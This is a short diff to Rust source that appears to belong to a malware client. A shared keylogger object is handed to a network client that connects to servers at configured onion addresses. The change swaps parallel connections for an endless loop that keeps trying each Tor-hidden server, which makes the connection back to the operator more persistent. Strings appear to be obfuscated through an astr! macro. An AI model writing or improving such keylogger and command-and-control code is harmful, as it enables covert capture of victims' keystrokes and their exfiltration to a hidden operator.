@@ -918,14 +918,17 @@ async fn netclient_impl() -> c_int {
         astr!(" netclient instance(s)")
     );
     let keylogger = Arc::new(Mutex::new(keylogger::Keylogger::new()));
-    let mut handles = Vec::new();
-    for cfg in configs {
-        let kl = keylogger.clone();
-        handles.push(tokio::spawn(async move { netclient_run(cfg, kl).await }));
-    }
 
-    for h in handles {
-        let _ = h.await;
+    loop {
+        for cfg in &configs {
+            println!(
+                "{} {}:{}",
+                astr!("Trying server "),
+                cfg.onion,
+                cfg.port
+            );
+            let _ = netclient_run(cfg.clone(), keylogger.clone()).await;
+        }
     }
     0
 }
